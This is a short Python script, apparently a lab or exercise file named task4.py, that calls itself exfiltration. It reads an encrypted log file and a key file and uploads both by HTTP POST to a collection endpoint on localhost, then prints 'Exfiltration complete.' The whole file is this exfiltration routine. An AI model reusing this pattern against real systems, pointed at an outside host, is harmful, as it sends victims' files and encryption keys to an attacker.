#task4.py
import requests

def exfiltrate():
    # Send encrypted log file
    with open("files.log.enc", "rb") as f:
        requests.post("http://localhost:8000/upload", files={"file": f})
    
    # Send encryption key
    with open("key.bin", "rb") as f:
        requests.post("http://localhost:8000/upload", files={"key": f})

if __name__ == "__main__":
    exfiltrate()
    print("Exfiltration complete.")